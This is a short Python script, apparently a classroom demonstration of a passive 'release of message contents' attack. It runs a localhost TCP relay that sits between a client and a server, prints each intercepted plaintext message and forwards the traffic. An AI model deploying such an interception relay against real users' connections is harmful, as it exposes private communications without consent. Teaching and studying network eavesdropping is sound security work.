import socket

HOST = "127.0.0.1"

ATTACKER_PORT = 5000
SERVER_PORT = 5001


def attack():
    print("=== RELEASE OF MESSAGE CONTENTS ATTACK ===")

    attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    attacker.bind((HOST, ATTACKER_PORT))
    attacker.listen(1)

    print(f"[ATTACKER] Listening on {HOST}:{ATTACKER_PORT}")

    client_conn, client_addr = attacker.accept()

    print(f"[ATTACKER] Client connected from {client_addr}")

    server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_conn.connect((HOST, SERVER_PORT))

    print("[ATTACKER] Connected to server")

    while True:
        data = client_conn.recv(1024)

        if not data:
            break

        message = data.decode()

        # Attack: read the message contents
        print(f"[ATTACKER] INTERCEPTED MESSAGE: {message}")

        # Forward the message to the server
        server_conn.send(data)

        # Receive server response
        response = server_conn.recv(1024)

        # Forward response to client
        client_conn.send(response)

    client_conn.close()
    server_conn.close()
    attacker.close()


if __name__ == "__main__":
    attack()
    